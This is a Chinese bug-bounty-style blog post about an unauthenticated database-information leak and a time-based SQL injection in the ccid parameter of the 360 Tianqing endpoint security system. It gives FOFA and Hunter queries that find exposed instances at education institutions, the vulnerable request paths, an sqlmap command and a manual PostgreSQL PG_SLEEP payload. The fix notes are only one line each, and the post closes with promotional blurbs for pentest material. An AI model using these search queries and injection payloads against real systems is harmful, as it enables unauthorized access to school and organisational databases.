# 原创
：  EDUSRC-记某擎未授权与sql注入

# EDUSRC-记某擎未授权与sql注入

**目录**

[360天擎 - 未授权与sql注入](#360%E5%A4%A9%E6%93%8E%20-%20%E6%9C%AA%E6%8E%88%E6%9D%83%E4%B8%8Esql%E6%B3%A8%E5%85%A5)

[信息收集](#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86)

[FOFA语法](#FOFA%E8%AF%AD%E6%B3%95)

[鹰图搜索](#%E9%B9%B0%E5%9B%BE%E6%90%9C%E7%B4%A2)

[360天擎未授权访问 - 数据库信息泄露](#360%E5%A4%A9%E6%93%8E%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%20-%20%E6%95%B0%E6%8D%AE%E5%BA%93%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2)

[漏洞复现](#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0)

[修复方案](#%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88)

[360天擎终端安全管理系统ccid处SQL注入](#360%E5%A4%A9%E6%93%8E%E7%BB%88%E7%AB%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9Fccid%E5%A4%84SQL%E6%B3%A8%E5%85%A5)

[漏洞复现](#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0)

[手动测试方法](#%E6%89%8B%E5%8A%A8%E6%B5%8B%E8%AF%95%E6%96%B9%E6%B3%95)

## 360天擎 - 未授权与sql注入

通常访问的页面如下，存在登录框

### 信息收集

#### FOFA语法

> 
- `title="360新天擎"`


需重点关注框框的图标，可以聚焦资产搜索

> 
- `icon_hash="-829652342"`


#### 鹰图搜索

这边展现EDUSRC的搜索语法，相对来说资产较少，因为是老洞

> 
- `web.title="360新天擎"&amp;&amp; ip.isp="教育"`


### 360天擎未授权访问 - 数据库信息泄露

#### 漏洞复现

路由后拼接`/api/dbstat/gettablessize`

> 
- `GET /api/dbstat/gettablessize HTTP/1.1`- `Host: {{Hostname}}`


#### 修复方案

未授权更多的是鉴权问题，增加权限校验

### 360天擎终端安全管理系统ccid处SQL注入

#### 漏洞复现

比较推荐的方式先测试是否存在数据库信息泄露，存在的话大概率存在`SQL`注入

路由后拼接`/api/dp/rptsvcsyncpoint?ccid=1`

> 
- `GET /api/dp/rptsvcsyncpoint?ccid=1 HTTP/1.1`- `Host: {{Hostname}}`


大致页面如下所示

这时候丢到`sqlmap`中(可能会慢，因为是时间注入)

> 
- `python .\sqlmap.py --batch -dbs -u https://{{Hostname}}/api/dp/rptsvcsyncpoint?ccid=1`


#### 手动测试方法

360天擎用的大概率是`PostgreSQL`，尝试如下时间注入`payload`，然后注意页面响应时间

> 
- `{{Hostname}}/api/dp/rptsvcsyncpoint?ccid=1';SELECT PG_SLEEP(5)-- `


#### 修复方案

SQL注入类问题更多的是需要进行参数预处理

还没看够？可以关注一下呦~

 渗透工具

技术文档、书籍

<img alt="" height="516" src="https://img-blog.csdnimg.cn/f333a24647774be5b99b00fb7019d620.png" width="852"/> <img alt="" height="523" src="https://img-blog.csdnimg.cn/3e579b7d7a164889a57771c035775069.png" width="856"/>

面试题

帮助你在面试中脱颖而出

视频

基础到进阶

环境搭建、HTML，PHP，MySQL基础学习，信息收集，SQL注入,XSS，CSRF，暴力破解等等

<img alt="" height="481" src="https://img-blog.csdnimg.cn/a601ca2e0eb040bd911477a4f54fef8e.png" width="694"/> <img alt="" height="77" src="https://img-blog.csdnimg.cn/04beeeb6757b422a83ca0900a349a544.png" width="665"/>
